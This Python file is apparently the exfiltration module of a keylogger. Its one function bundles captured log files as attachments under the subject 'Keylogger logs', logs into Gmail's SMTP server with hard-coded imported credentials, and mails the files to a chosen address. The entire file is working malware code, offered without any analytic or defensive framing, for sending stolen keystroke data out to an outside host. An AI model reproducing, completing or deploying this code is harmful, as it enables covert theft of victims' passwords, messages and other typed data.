import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from modules.constants import email_address, email_password, output


def send_email(filenames_file_paths, to_address):

    mailer = MIMEMultipart()
    mailer['From'] = email_address
    mailer['To'] = to_address
    mailer['Subject'] = 'Keylogger logs'
    mailer.attach(MIMEText('body', 'plain'))

    for filename, file in filenames_file_paths:
        attachment = open(file, 'rb')
        reader = MIMEBase('application', 'octet-stream')
        reader.set_payload((attachment).read())

        encoders.encode_base64(reader)

        reader.add_header('Content-Disposition', f"attachment; filename={filename}")
        mailer.attach(reader)

    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login(email_address, email_password)

    text = mailer.as_string()

    smtp.sendmail(email_address, to_address, text)
    smtp.quit()
